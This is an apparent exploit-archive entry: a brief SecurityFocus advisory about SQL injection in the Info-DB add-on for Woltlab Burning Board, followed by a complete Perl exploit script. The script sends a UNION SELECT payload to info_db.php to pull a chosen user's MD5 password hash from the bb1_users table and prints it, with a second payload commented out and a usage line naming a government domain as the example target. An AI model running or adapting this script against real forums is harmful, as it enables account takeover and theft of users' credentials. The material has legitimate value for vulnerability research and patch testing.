source: http://www.securityfocus.com/bid/15214/info

Info-DB is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.

A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database. 

#!/usr/bin/perl -w

## Woltlab Burning Board <= 2.3.3 info_db.php SQL injection
##
## This perl script will fetch the MD5 hash from any wbb that is running with info_db.php
##
##
## 
##
##
##
## written by [R]
## greetz fly out to the whole rootbox/batznet crew!
##



use LWP::Simple;
use strict;
use warnings;


my $target = $ARGV[0];
my $userid = $ARGV[1];
my $exploit = "/info_db.php?action=file&fileid=-1%20UNION%20SELECT%20password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password%20FROM%20bb1_users%20WHERE%20userid=$userid/*";

# different way of exploiting, see adv.. ;)
# my $exploit = "/info_db.php?action=file&fileid=59&subkatid=10'%20UNION%20SELECT%20password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password,password%20FROM%20bb1_users%20WHERE%20userid=$userid/*";

if ($target eq "" && $userid eq "") {
print "\nWoltlab Burning Board <= 2.3.3 info_db.php SQL injection\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "\nUsage:\n";
print "perl $0 [TARGET] [USERID]\n";
print "perl $0 fbi.gov/path/ 1\n\n";
exit();
}


print ("\n[+] Trying to exploit the target...");
sleep(10);
print ("\n[+] Ok - should be exploited!\n");
sleep(5);


my $hash = get "http://www.$target/$exploit";


$hash =~ s/<.*?>//sg; # clean the whole html code
$hash =~ s!\ !!g; # clean  
$hash =~ s/�//g; # clean �

print ("\n[+] Successfully exploited!\n");
print ("\n");

print ("[+] MD5 Hash: ");
print $hash =~ m/\b(\w{32})\b/; 	# get the hash
print ("\n\n");


exit();

# batznet-security.de && batznet.com